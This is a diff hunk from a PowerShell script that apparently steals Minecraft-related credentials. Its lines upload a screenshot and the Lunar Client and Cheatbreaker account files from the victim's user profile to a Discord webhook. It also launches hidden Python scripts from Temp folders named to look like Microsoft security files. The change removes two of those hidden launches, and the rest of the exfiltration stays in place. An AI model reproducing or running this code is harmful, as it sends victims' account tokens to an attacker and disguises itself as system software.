@@ -125,12 +125,9 @@ Start-Sleep -Seconds 3
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
-powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID.py
 Start-Sleep -Seconds 2
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
-Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
-powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_use.py
 #powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_utils.py
 python C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
 
